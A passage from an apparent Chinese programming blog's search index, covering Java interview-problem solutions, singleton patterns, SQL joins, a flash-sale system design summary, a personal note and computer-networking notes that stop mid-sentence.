str.setCharAt(indexnew--,str.charAt(indexOld)); &#125; &#125; return str.toString(); &#125; public static void main(String[] args) &#123; String result = replaceSpace(new StringBuffer("We Are Happy.")); System.out.println(result); &#125;&#125; 运行结果： 1We%20Are%20Happy.]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题2 ：二维数组中的查找】]]></title>
    <url>%2F2018%2F08%2F04%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%982%20%EF%BC%9A%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E6%9F%A5%E6%89%BE%E3%80%91%2F</url>
    <content type="text"><![CDATA[二维数组中的查找。 题目在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。 比如这样的二维数组: 123456&#123; &#123;1, 2, 8, 9&#125;, &#123;2, 4, 9, 12&#125;, &#123;4, 7, 10, 13&#125;, &#123;6, 8, 11, 15&#125; &#125; 然后判断是否存在某一个数。 思路考察数组的特性，我们如果从右上角的元素开始找，比如我们要找4，比9小，那么直接删除列即可，因为这个列上的元素看到都大于9；那么我们这时锁定8，发现还是比他小，再删除一列；这时变成了2，发现4比他大，则删除行；这个是后就锁定了4，就是我们想要的答案。 规律：首先选取数组中右上角的数字。如果该数字等于要查找的数字，查找过程结束； 如果该数字大于要查找的数字，剔除这个数字所在的列：如果该数字小于要查找的数字，剔除这个数字所在的行。 也就是说如果要查找的数字不在数组的右上角，则每－次都在数组的查找范围中剔除）行或者一列，这样每一步都可以缩小查找的范围，直到找到要查找的数字，或者查找范围为空。 程序1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Test02 &#123; /** * @Author 【swg】. * @Date 2018/3/7 19:50 * @param arr 待查找的数组 * @param number 要查找的数 * @return 查找结果，true找到，false没有找到 */ public static boolean find(int[][] arr,int number)&#123; if(arr == null || arr.length &lt; 1 || arr[0].length &lt; 1)&#123; return false; &#125; //统计行数和列数 int rows = arr.length; int cols = arr[0].length; //初始位置为第一行最后一列 int row = 0,col = cols-1; while(row &gt;=0 &amp;&amp; col &gt;=0 &amp;&amp; row &lt; rows &amp;&amp; col &lt;cols)&#123; if(arr[row][col] == number)&#123; return true;//相等则直接返回 &#125;else if(arr[row][col] &gt; number)&#123; col--;//数组中的这个数比number大，则删除这个列 &#125;else &#123; row++;//数组中的这个数比number小，则删除这个行 &#125; &#125; return false; &#125; public static void main(String[] args) &#123; int[][] matrix = &#123; &#123;1, 2, 8, 9&#125;, &#123;2, 4, 9, 12&#125;, &#123;4, 7, 10, 13&#125;, &#123;6, 8, 11, 15&#125; &#125;; System.out.println(find(matrix, 7)); // 要查找的数在数组中 System.out.println(find(matrix, 5)); // 要查找的数不在数组中 System.out.println(find(matrix, 1)); // 要查找的数是数组中最小的数字 System.out.println(find(matrix, 15)); // 要查找的数是数组中最大的数字 System.out.println(find(matrix, 0)); // 要查找的数比数组中最小的数字还小 System.out.println(find(matrix, 16)); // 要查找的数比数组中最大的数字还大 System.out.println(find(null, 16)); // 健壮性测试，输入空指针 &#125;&#125; 运行结果：1234567truefalsetruetruefalsefalsefalse]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【面试题1 ： 实现Singleton 模式——七种实现方式】]]></title>
    <url>%2F2018%2F08%2F03%2F%E3%80%90%E9%9D%A2%E8%AF%95%E9%A2%981%20%EF%BC%9A%20%E5%AE%9E%E7%8E%B0Singleton%20%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E4%B8%83%E7%A7%8D%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%E3%80%91%2F</url>
    <content type="text"><![CDATA[实现Singleton模式——七种实现方式。 单例模式是最常用也是最基础的一种模式，我们来好好地总结一下吧。 目录 第一种实现方式-(饿汉，常用) 第二种实现方式-(懒汉，不安全) 第三种实现方式-(加锁的懒汉，性能低) 第四种实现方式-(静态块，可以) 第五种实现方式–(静态内部类，推荐) 第六种实现方式-(枚举，推荐) 第七种实现方式-(重要，面试) 1. 第一种实现方式-饿汉，常用123456789101112/** * 单例模式，饿汉式，线程安全 */public static class Singleton01&#123; private static Singleton01 instance = new Singleton01(); private Singleton01()&#123;&#125; public static Singleton01 getInstance()&#123; return instance; &#125;&#125; 饿汉，只要有就先加载出来让我吃。 首先是写明私有的构造方法防止被new，然后直接就实例化，最后调用，不存在线程安全问题。 2. 第二种实现方式-懒汉，不安全123456789101112131415/** * 单例模式，懒汉式，线程不安全 */public static class Singleton02&#123; private Singleton02()&#123;&#125; private static Singleton02 instance = null; public static Singleton02 getInstance()&#123; if(instance == null)&#123; instance = new Singleton02(); &#125; return instance; &#125;&#125; 懒汉，就是我饿的时候再找吃的，属于懒加载，在instance = new Singleton02();可能会出现线程安全问题，因为new一个对象在JVM底层做了如下工作： 给 instance 分配内存 调用 Singleton 的构造函数来初始化成员变量 将instance对象指向分配的内存空间（执行完这步 instance 就为非 null 了） 显然是不能保证原子性的。 3. 第三种实现方式-加锁的懒汉，性能低123456789101112131415/** * 单例模式，懒汉式，线程安全，多线程环境下效率不高 */public static class Singleton03&#123; private Singleton03()&#123;&#125; private static Singleton03 instance = null; public static synchronized Singleton03 getInstance()&#123; if(instance == null)&#123; instance = new Singleton03(); &#125; return instance; &#125;&#125; 既然提到不安全，那么就加锁，显然是可以解决线程安全性问题的，但是效率会比较低。 4. 第四种实现方式-静态块，可以12345678910111213141516/** * 单例模式，懒汉式，变种，线程安全 */public static class Singleton04&#123; private Singleton04()&#123;&#125; private static Singleton04 instance = null; static &#123; instance = new Singleton04(); &#125; public static Singleton04 getInstance()&#123; return instance; &#125;&#125; 当第一次引用getInstance()方法的时候，访问静态内部类中的静态成员变量，此时该内部类需要调用static代码块(因为首次访问该类)。而后再次访问getInstance()方法会直接返回instace引用。这种做法相对于传统做法更加巧妙。 5. 第五种实现方式–静态内部类，推荐1234567891011121314/** * 单例模式，使用静态内部类，线程安全【推荐】 */ public static class Singleton05&#123; private Singleton05()&#123;&#125; private static final class SingletonHolder&#123; private static final Singleton05 instance = new Singleton05(); &#125; public static Singleton05 getInstance()&#123; return SingletonHolder.instance; &#125;&#125; 定义一个私有的内部类，在第一次用这个嵌套类时，会创建一个实例。而类型为SingletonHolder的类，只有在Singleton.getInstance()中调用，由于私有的属性，他人无法使用SingleHolder，不调用Singleton.getInstance()就不会创建实例。优点：达到了lazy loading的效果，即按需创建实例。 6. 第六种实现方式-枚举，推荐123456/** * 静态内部类，使用枚举方式，线程安全【推荐】 */public enum Singleton06&#123; INSTANCE;&#125; 在《Effective Java》最后推荐了这样一个写法，简直有点颠覆，不仅超级简单，而且保证了现场安全。这里引用一下，此方法无偿提供了序列化机制，绝对防止多次实例化，及时面对复杂的序列化或者反射攻击。单元素枚举类型已经成为实现Singleton的最佳方法。 很多人会对枚举法实现的单例模式很不理解。这里需要深入理解的是两个点： 枚举类实现其实省略了private类型的构造函数 枚举类的域(field)其实是相应的enum类型的一个实例对象 对于第一点实际上enum内部是如下代码: 12345public enum Singleton &#123; INSTANCE; // 这里隐藏了一个空的私有构造方法 private Singleton () &#123;&#125;&#125; 比较清楚的写法是： 12345678910111213141516171819202122public class SingletonExample5 &#123; private SingletonExample5()&#123;&#125; public static SingletonExample5 getInstance()&#123; return Singleton.INSTANCE.getInstance(); &#125; private enum Singleton&#123; INSTANCE; private SingletonExample5 singleton; //JVM保证这个方法绝对只调用一次 Singleton()&#123; singleton = new SingletonExample5(); &#125; public SingletonExample5 getInstance()&#123; return singleton; &#125; &#125;&#125; 7. 第七种实现方式-重要，面试12345678910111213141516171819/** * 静态内部类，使用双重校验锁，线程安全【推荐】 */ public static class Singleton07&#123; private Singleton07()&#123;&#125; private volatile static Singleton07 instance = null; public static Singleton07 getInstance()&#123; if(instance == null)&#123; synchronized (Singleton07.class)&#123; if(instance == null)&#123; instance = new Singleton07(); &#125; &#125; &#125; return instance; &#125;&#125; 思想:先判断一下是不是null，然后加锁，再判断一下是否为null。如果还是null，则可以放心地new。 还是不大明白为什么要判断两次null？ 第一次null很简单，如果不为null，直接return，不需要进锁了。如果为null，说明有可能是第一次进来。 这里第一次进来的线程可能不止一个，假设是两个，分别为线程A和线程B，那么进行排队，假设A先进来，如果没有Null判断，那么它就直接new，释放锁没这个时候B获得锁，还是直接new，不就出现了两个对象了吗？]]></content>
      <tags>
        <tag>剑指Offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内连接和外连接]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%86%85%E8%BF%9E%E6%8E%A5%E5%92%8C%E5%A4%96%E8%BF%9E%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[最近上班，天天有人来面试，问的问题我都听的蛮清楚的，比如内连接和外连接的区别，好像很简单，但还是说的不好，这里总结一下。 12345 A表 B表id name id name 1 a 1 b 2 b 3 c4 c 内连接内连接就是左表和右表相同的数据: 1select * from A inner join B on A.id=B.id 结果： 12id name id name 1 a 1 b 左外连接左外连接就是以左表为准，去匹配右表，左表有多少条数据，结果就是多少条数据1select * from A left join B on A.id=B.id 1234id name id name 1 a 1 b 2 b null null4 c null null 右外连接右外连接就是与左外连接反之，以右表为准，去匹配左表，右表有多少条数据，结果就是多少条数据 1select * from A right join B on A.id=B.id 123id name id name 1 a 1 b null null 3 c 全外连接全外连接数据条数不一定，相当于是左外连接和右外连接的综合 1select * from A full join B on A.id=B.id 12345id name id name 1 a 1 b 2 b null nullnull null 3 c4 c null null 交叉连接 交叉连接不带WHERE 子句，它返回被连接的两个表所有数据行的笛卡尔积，返回到结果集合中的数据行数等于第一个表中符合查询条件的数据行数乘以第二个表中符合查询条件的数据行数。 1select * from A join B 1234567id name id name1 a 1 b1 a 3 c2 b 1 b2 b 3 c4 c 1 b4 c 3 c 内连接和外连接的区别内连接只列出两张表共同匹配的数据行，而外连接的结果集中不仅包含符合连接条件的数据行，还包括左表(左外连接或左连接)、右表(右外连接或右连接)或两个边接表(全外连接)中的所有数据行。]]></content>
      <tags>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8.秒杀总结]]></title>
    <url>%2F2018%2F07%2F21%2F8.%E7%A7%92%E6%9D%80%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[对于课程的总结。 总体重点回顾首先我们要熟悉一下表结构，核心的是商品表、秒杀商品表、订单信息表和秒杀订单表。 商品表：12345678910CREATE TABLE `goods`( `id` BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT '商品ID', `goods_name` VARCHAR(16) DEFAULT NULL COMMENT '商品名称', `goods_title` VARCHAR(64) DEFAULT NULL COMMENT '商品标题', `goods_img` VARCHAR(64) DEFAULT NULL COMMENT '商品图片', `goods_detail` LONGTEXT COMMENT '商品的详情介绍', `goods_price` DECIMAL(10,2) DEFAULT '0.00' COMMENT '商品单价', `goods_stock` INT(11) DEFAULT '0' COMMENT '商品库存，-1表示没有限制', PRIMARY KEY (`id`)); 秒杀商品表：123456789CREATE TABLE `miaosha_goods`( `id` BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT '秒杀商品ID', `goods_id` BIGINT(16) DEFAULT NULL COMMENT '商品id', `miaosha_price` DECIMAL(10,2) DEFAULT '0.00' COMMENT '秒杀价', `stock_count` INT(11) DEFAULT '0' COMMENT '库存数量', `start_date` datetime DEFAULT NULL COMMENT '秒杀开始时间', `end_date` datetime DEFAULT NULL COMMENT '秒杀结束时间', PRIMARY KEY (`id`)); 订单信息表：1234567891011121314CREATE TABLE `order_info`( `id` BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT 'order ID', `user_id` BIGINT(20) DEFAULT NULL COMMENT '用户id', `goods_id` BIGINT(20) DEFAULT NULL COMMENT '商品id', `delivery_addr_id` BIGINT(20) DEFAULT NULL COMMENT '收货地址', `goods_name` VARCHAR(16) DEFAULT NULL COMMENT '商品名称', `goods_count` INT(11) DEFAULT '0' COMMENT '商品数量', `goods_price` DECIMAL(10,2) DEFAULT '0.00' COMMENT '商品单价', `order_channel` TINYINT(4) DEFAULT '0' COMMENT '1pc,2android,3ios', `status` TINYINT(4) DEFAULT '0' COMMENT '0新建未支付，2已支付，3已发货4，已收货，5已完成', `create_date` datetime DEFAULT NULL COMMENT '订单创建时间', `pay_date` datetime DEFAULT NULL COMMENT '支付时间', PRIMARY KEY (`id`)); 秒杀订单表：1234567CREATE TABLE `miaosha_order`( `id` BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT '秒杀 order ID', `user_id` BIGINT(20) DEFAULT NULL COMMENT '用户id', `order_id` BIGINT(20) DEFAULT NULL COMMENT '订单id', `goods_id` BIGINT(20) DEFAULT NULL COMMENT '商品id', PRIMARY KEY (`id`)); 下面就是言归正传的进行秒杀功能的实现。由浅入深地来实现。 一开始想到的整体思路是： 判断库存，根据秒杀商品的id来获取秒杀的库存 给用户id和秒杀商品id做成一个唯一组合索引，用它来判断这个用户是否已经秒杀到了 减库存成功，再生成订单，并且写入秒杀订单(同一事务中完成) 优化1：页面静态化 我们可以用redis对html进行缓存，但是可能更好的方案是前台页面进行静态化，只需要与后端进行必要的数据交互即可。 注意，这里的核心是最后又一个减库存操作，减库存成功之后，下面再进行生成订单，这里为了防止库存降为负数，sql写成了： 1update miaosha_goods set stock_count = stock_count-1 where goods_id=#&#123;goodsId&#125; and stock_count &gt; 0 这里还可以用乐观锁来实现安全的减库存: 123num_old = select available from goods where id = xx and available &gt;= 1 ;num_new = num_old - 1 ;update goods set num=num_new where id=xx and num=num_old ; 注意，当两个进程同时进来的时候，update操作对于id为主键索引的情况下，是会对数据加行锁。 所以，我们通过数据库的排他锁来防止两个线程同时修改同一条数据。 优化2：消息队列+redis预减库存 这里MQ用了rabbitMQ，其核心是Exchange(消息交换机，它指定消息按什么规则，路由到哪个队列)、Queue(消息队列载体，每个消息都会被投入到一个或多个队列)和Binding(绑定，它的作用就是把exchange和queue按照路由规则绑定起来),然后有四种交换机：Direct交换机、Topic交换机、Fanout交换机、Headers交换机。 总体思路是：减少数据库访问 系统初始化，把商品库存数量加载到redis 收到请求，redis预减库存，库存不够，直接返回，否则进入3 请求入队，立即返回排队中 请求出队，生成订单，减少库存 客户端轮询，是否秒杀成功 先将所有的秒杀商品的库存全部放进redis中，当秒杀接口被调用一次，redis就执行decr一次，如果redis中的库存已经小于等于0了，那么就立即返回失败。下面再进行判断是否是重复秒杀，最后是进入消息队列，慢慢让数据库去操作(判断数据库真实库存、减库存、生成订单等)。前端进行轮训，要么是排队中、要么是秒杀失败、要么是秒杀成功。 优化3：秒杀地址接口隐藏 实现思路：对于秒杀接口，不是直接去请求do_miaosha这个接口了，而是先去后端获取一个path(并且存进redis中key:userid_goodsid,value:path)，前端拿到这个path之后拼装到do_miaosha这个接口上去，秒杀接口，先拿到这个path验证一下是否正确，正确再进入下面的逻辑。这样，在秒杀开始前，都是不知道这个秒杀的链接到底是什么，有效防止了恶意的请求。 优化4：图形验证码 在秒杀开始的时候，仍然会存在恶意刷单的请求，这个时候接口地址已经确定下来了，如何防止这种情况呢（机器人），可以用验证码来实现。也可以分散用户的请求，减少并发。 优化4：接口防刷 限制用户在规定时间内请求的次数。 再次总结一开始想到的整体思路是： 判断库存，根据秒杀商品的id来获取秒杀的库存 给用户id和秒杀商品id做成一个唯一组合索引，用它来判断这个用户是否已经秒杀到了 减库存成功，再生成订单，并且写入秒杀订单(同一事务中完成) 在此基础上进行优化： 页面的静态化，即动静分离，前后端用ajax传递动态数据即可 更新数据库库存的sql 秒杀商品的库存先预存到redis中 减库存、生成订单的事务操作放进消息队列去处理 秒杀地址接口隐藏 图形验证码分散用户请求，减少并发 接口防刷，限制单个用户的请求数量 面试问题：秒杀的场景下，如何解决库存超卖问题？ 错误的回答：通过加分布式锁，通过数据库的乐观锁。。。 正确的回答：秒杀场景下，并发会特别的大，有两种情况会导致库存卖超： 一个用户同时发出了多个请求，如果库存足够，没加限制，用户就可以下多个订单。 减库存的SQL上没有加库存数量的判断，并发的时候也会导致把库存减成负数。 对于（1）前端加验证码，防止合法用户快速点鼠标同时发出多个请求，在后端的miaosha_order表中，对user_id和goods_id加唯一索引，确保就算是刷接口一个用户对一个商品绝对不会生成两个订单。对于（2）需要在扣减库存的SQL上加上库存数量的判断，只有扣减库存成功才可以生成订单： 1update miaosha_goods set stock_count = stock_count-1 where goods_id=#&#123;goodsId&#125; and stock_count &gt; 0 mysql商品库存扣减问题总结 还有一种方案来防止超卖并且速度比较快的方法是分布式锁。核心思路是用setnx和getset来实现锁，只让一个线程完成查库存-减库存-生成订单这一系列的操作。 使用Redis分布式锁处理并发，解决超卖问题]]></content>
      <tags>
        <tag>秒杀系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我们的重量]]></title>
    <url>%2F2018%2F07%2F21%2F%E9%9A%8F%E7%AC%941%2F</url>
    <content type="text"><![CDATA[今天是2018/6/6号，一个吉祥的日子，记录此时的重量。 小徐说她要减肥，减了五年多了吧，果然，越减越肥了。 我要增肥，今年半年才见成效，目标是180。再去健身房练肌肉。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机网络]]></title>
    <url>%2F2018%2F07%2F21%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%2F</url>
    <content type="text"><![CDATA[本篇讲述计算机网络。 一、概述网络的网络网络把主机连接起来，而互联网是把多种不同的网络连接起来，因此互联网是网络的网络。 ISP互联网服务提供商 ISP 可以从互联网管理机构获得许多 IP 地址，同时拥有通信线路以及路由器等联网设备，个人或机构向 ISP 缴纳一定的费用就可以接入互联网。 目前的互联网是一种多层次 ISP 结构，ISP 根据覆盖面积的大小分为第一层 ISP、区域 ISP 和接入 ISP。 互联网交换点 IXP 允许两个 ISP 直接相连而不用经过第三个 ISP。 主机之间的通信方式 客户-服务器（C/S）：客户是服务的请求方，服务器是服务的提供方。 对等（P2P）：不区分客户和服务器。 电路交换与分组交换 （以上分别为：电路交换、报文交换以及分组交换） 1. 电路交换电路交换用于电话通信系统，两个用户要通信之前需要建立一条专用的物理链路，并且在整个通信过程中始终占用该链路。由于通信的过程中不可能一直在使用传输线路，因此电路交换对线路的利用率很低，往往不到 10%。 2. 报文交换报文交换用于邮局通信系统，邮局接收到一份报文之后，先存储下来，然后把相同目的地的报文一起转发到下一个目的地，这个过程就是存储转发过程。 3. 分组交换分组交换也使用了存储转发，但是转发的是分组而不是报文。把整块数据称为一个报文，由于一个报文可能很长，需要先进行切分，来满足分组能处理的大小。在每个切分的数据前面加上首部之后就成为了分组，首部包含了目的地址和源地址等控制信息。 分组交换允许在一条传输线路上传送多个主机的分组，也就是说两个用户之间的通信不需要占用端到端的线路资源。 相比于报文交换，由于分组比报文更小，因此分组交换的存储转发速度更加快速。 时延总时延 = 发送时延 + 传播时延 + 处理时延 + 排队时延 1. 发送时延主机或路由器发送数据帧所需要的时间。 其中 l 表示数据帧的长度，v 表示发送速率。 2. 传播时延电磁波在信道中传播一定的距离需要花费的时间，电磁波传播速度接近光速。 其中 l 表示信道长度，v 表示电磁波在信道上的传播速率。 3. 处理时延主机或路由器收到分组时进行处理所需要的时间，例如分析首部、从分组中提取数据、进行差错检验或查找适当的路由等。 4. 排队时延分组在路由器的输入队列和输出队列中排队等待的时间，取决于网络当前的通信量。 计算机网络体系结构 1. 五层协议 应用层：为特定应用程序提供数据传输服务，例如 HTTP、DNS 等。数据单位为报文。 运输层：提供的是进程间的通用数据传输服务。由于应用层协议很多，定义通用的运输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。 网络层：为主机之间提供数据传输服务，而运输层协议是为主机中的进程提供服务。网络层把运输层传递下来的报文段或者用户数据报封装成分组。 数据链路层：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的节点提供服务。数据链路层把网络层传来的分组封装成帧。 物理层：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。 2. 七层协议其中表示层和会话层用途如下： 表示层：数据压缩、加密以及数据描述。这使得应用程序不必担心在各台主机中表示/存储的内部格式不同的问题。 会话层：建立及管理会话。 五层协议没有表示层和会话层，而是将这些功能留给应用程序开发者处理。 3. 数据在各层之间的传递过程在向下的过程中，需要添加下层协议所需要的首部或者尾部，而在向上的过程中不断拆开首部和尾部。 路由器只有下面三层协议，因为路由器位于网络核心中，不需要为进程或者应用程序提供服务，因此也就不需要运输层和应用层。 4. TCP/IP 体系结构它只有四层，相当于五层协议中数据链路层和物理层合并为网络接口层。 现在的 TCP/IP 体系结构不严格遵循 OSI 分层概念，应用层可能会直接使用 IP 层或者网络接口层。 TCP/IP 协议族是一种沙漏形状，中间小两边大，IP 协议在其中占用举足轻重的地位。 二、物理层通信方式 单向通信，又称为单工通信； 双向交替通信，又称为半双工通信； 双向同时通信，又称为全双工通信。 带通调制模拟信号是连续的信号，数字信号是离散的信号。带通调制把数字信号转换为模拟信号。 信道复用技术1. 频分复用、时分复用频分复用的所有用户在相同的时间占用不同的频率带宽资源；时分复用的所有用户在不同的时间占用相同的频率带宽资源。 使用这两种方式进行通信，在通信的过程中用户会一直占用一部分信道资源。但是由于计算机数据的突发性质，通信过程没必要一直占用信道资源而不让出给其它用户使用，因此这两种方式对信道的利用率都不高。 2. 统计时分复用是对时分复用的一种改进，不固定每个用户在时分复用帧中的位置，只要有数据就集中起来组成统计时分复用帧然后发送。 3. 波分复用光的频分复用。由于光的频率很高，因此习惯上用波长而不是频率来表示所使用的光载波。 4. 码分复用码分复用需要发送的数据量为原先的 m 倍。 三、数据链路层信道分类 点对点信道：一对一通信方式； 广播信道：一对多通信方式。 三个基本问题1. 封装成帧将网络层传下来的分组添加首部和尾部，用于标记帧的开始和结束。 2. 透明传输透明表示一个实际存在的事物看起来好像不存在一样。 帧使用首部和尾部进行定界，如果帧的数据部分含有和首部尾部相同的内容，那么帧的开始和结束位置就会被错误的判定。需要在数据部分出现首部尾部相同的内容前面插入转义字符，如果出现转义字符，那么就在转义字符前面再加个转义字符，在接收端进行处理之后可以还原出原始数据。这个过程透明传输的内容是转义字符，用户察觉不到转义字符的存在。 3. 差错检测目前数据链路层广泛使用了循环冗余检验（CRC）来检查比特差错。 局域网局域网是典型的一种广播信道，主要特点是网络为一个单位所拥有，且地理范围和站点数目均有限。 可以按照网络拓扑对局域网进行分类： PPP 协议用于点对点信道中。互联网用户通常需要连接到某个 ISP 之后才能接入到互联网，PPP 协议是用户计算机和 ISP 进行通信时所使用的数据链路层协议。 在 PPP 的帧中： F 字段为帧的定界符 A 和 C 字段暂时没有意义 FCS 字段是使用 CRC 的检验序列 信息部分的长度不超过 1500 CSMA/CD 协议用于广播信道中。在广播信道上，同一时间只能允许一台计算机发送数据。 CSMA/CD 表示载波监听多点接入 / 碰撞检测。 多点接入 ：说明这是总线型网络，许多计算机以多点的方式连接到总线上。 载波监听 ：每个站都必须不停地监听信道。在发送前，如果监听到信道正在使用，就必须等待。 碰撞检测 ：在发送中，如果监听到信道已有其它站正在发送数据，就表示发生了碰撞。虽然每一个站在发送数据之前都已经监听到信道为空闲，但是由于电磁波的传播时延的存在，还是有可能会发生碰撞。 记端到端的传播时延为 τ，最先发送的站点最多经过 2τ 就可以知道是否发生了碰撞，称 2τ 为 争用期 。只有经过争用期之后还没有检测到碰撞，才能肯定这次发送不会发生碰撞。 当发生碰撞时，站点要停止发送，等待一段时间再发送。这个时间采用 截断二进制指数退避算法 来确定，从离散的整数集合 {0, 1, .., (2k-1)} 中随机取出一个数，记作 r，然后取 r 倍的争用期作为重传等待时间。 扩展局域网1. 在物理层进行扩展使用集线器进行扩展。 集线器的主要功能是对接收到的信号进行放大，以扩大网络的传输距离。 集线器不能根据 MAC 地址进行转发，而是以广播的方式发送数据帧。 集线器是一种共享式的传输设备，意味着同一时刻只能传输一组数据帧。 2. 在链路层进行扩展最开始使用的是网桥，它收到一个帧时，根据帧的 MAC 地址，查找网桥中的地址表，确定帧转发的接口。 网桥不是共享式设备，因此性能比集线器这种共享式设备更高。 交换机的问世很快就淘汰了网桥，它实质上是一个多接口网桥，而网桥是两接口。交换机的每个接口都能直接与一个主机或者另一个交换机相连，并且一般都工作在全双工方式。 交换机具有自学习能力，学习的是交换表的内容。交换表中存储着 MAC 地址到接口的映射。下图中，交换机有 4 个接口，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的映射写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送广播帧，主机 C 和主机 D 会丢弃该帧。主机 B 收下之后，查找交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机添加主机 B 到接口 3 的映射。 3. 虚拟局域网虚拟局域网可以建立与物理位置无关的逻辑组，只有在同一个虚拟局域网中的成员才会收到链路层广播信息，例如下图中 (A1, A2, A3, A4) 属于一个虚拟局域网，A1 发送的广播会被 A2、A3、A4 收到，而其它站点收不到。 MAC 层MAC 地址是 6 字节（48 位）的地址，用于唯一标识网络适配器（网卡），一台主机拥有多少个适配器就有多少个 MAC 地址，例如笔记本电脑普遍存在无线网络适配器和有线网络适配器。 在 MAC 帧中： 类型 ：标记上层使用的协议； 数据 ：长度在 46-1500 之间，如果太小则需要填充； FCS ：帧检验序列，使用的是 CRC 检验方法； 前同步码 ：只是为了计算 FCS 临时加入的，计算结束之后会丢弃。 四、网络层网际协议 IP 概述因为网络层是整个互联网的核心，因此应当让网络层尽可能简单。网络层向上只提供简单灵活的、无连接的、尽最大努力交互的数据报服务。 使用 IP 协议，可以把异构的物理网络连接起来，使得在网络层看起来好像是一个统一的网络。 与 IP 协议配套使用的还有三个协议： 地址解析协议 ARP（Address Resolution Protocol） 网际控制报文协议 ICMP（Internet Control Message Protocol） 网际组管理协议 IGMP（Internet Group Management Protocol） IP 数据报格式 版本 : 有 4（IPv4）和 6（IPv6）两个值； 首部长度 : 占 4 位，因此最大值为 15。值为 1 表示的是 1 个 32 位字的长度，也就是 4 字节。因为首部固定长度为 20 字节，因此该值最小为 5。如果可选字段的长度不是 4 字节的整数倍，就用尾部的填充部分来填充。 区分服务 : 用来获得更好的服务，一般情况下不使用。 总长度 : 包括首部长度和数据部分长度。 标识 : 在数据报长度过长从而发生分片的情况下，相同数据报的不同分片具有相同的标识符。 片偏移 : 和标识符一起，用于发生分片的情况。片偏移的单位为 8 字节。 生存时间 ：TTL，它的存在是为了防止无法交付的数据报在互联网中不断兜圈子。以路由器跳数为单位，当 TTL 为 0 时就丢弃数据报。 协议 ：指出携带的数据应该上交给哪个协议进行处理，例如 ICMP、TCP、UDP 等。 首部检验和 ：因为数据报每经过一个路由器，都要重新计算检验和，因此检验和不包含数据部分可以减少计算的工作量。 IP 地址编址方式IP 地址的编址方式经历了三个历史阶段： 分类 子网划分 无分类 1. 分类由两部分组成，网络号和主机号，其中不同分类具有不同的网络号长度，并且是固定的。 IP 地址 ::= {&lt; 网络号 &gt;, &lt; 主机号 &gt;} 2. 子网划分通过在主机号字段中拿一部分作为子网号，把两级 IP 地址划分为三级 IP 地址。注意，外部网络看不到子网的存在。 IP 地址 ::= {&lt; 网络号 &gt;, &lt; 子网号 &gt;, &lt; 主机号 &gt;} 要使用子网，必须配置子网掩码。一个 B 类地址的默认子网掩码为 255.255.0.0，如果 B 类地址的子网占两个比特，那么子网掩码为 11111111 11111111 11000000 00000000，也就是 255.255.192.0。 3. 无分类无分类编址 CIDR 消除了传统 A 类、B 类和 C 类地址以及划分子网的概念，使用网络前缀和主机号来对 IP 地址进行编码，网络前缀的长度可以根据需要变化。 IP 地址 ::= {&lt; 网络前缀号 &gt;, &lt; 主机号 &gt;} CIDR 的记法上采用在 IP 地址后面加上网络前缀长度的方法，例如 128.14.35.7/20 表示前 20 位为网络前缀。 CIDR 的地址掩码可以继续称为子网掩码，子网掩码首 1 长度为网络前缀的长度。 一个 CIDR 地址块中有很多地址，一个 CIDR 表示的网络就可以表示原来的很多个网络，并且在路由表中只需要一个路由就可以代替原来的多个路由，减少了路由表项的数量。把这种通过使用网络前缀来减少路由表项的方式称为路由聚合，也称为 构成超网 。 在路由表中的项目由“网络前缀”和“下一跳地址”组成，在查找时可能会得到不止一个匹配结果，应当采用最长前缀匹配来确定应该匹配哪一个。 IP 地址和 MAC 地址网络层实现主机之间的通信，而链路层实现具体每段链路之间的通信。因此在通信过程中，IP 数据报的源地址和目的地址始终不变，而 MAC 地址随着链路的改变而改变。 地址解析协议 ARP实现由 IP 地址得到 MAC 地址。 每个主机都有一个 ARP 高速缓存，里面有本局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。 如果主机 A 知道主机 B 的 IP 地址，但是 ARP 高速缓存中没有该 IP 地址到 MAC 地址的映射，此时主机 A 通过广播的方式发送 ARP 请求分组，主机 B 收到该请求后会发送 ARP 响应分组给主机 A 告知其 MAC 地址，随后主机 A 向其高速缓存中写入主机 B 的 IP 地址到 MAC 地址的映射。 路由器的结构路由器从功能上可以划分为：路由选择和分组转发。 分组转发结构由三个部分组成：交换结构、一组输入端口和一组输出端口。 路由器分组转发流程 从数据报的首部提取目的主机的 IP 地址 D，得到目的网络地址 N。 若 N 就是与此路由器直接相连的某个网络地址，则进行直接交付； 若路由表中有目的地址为 D 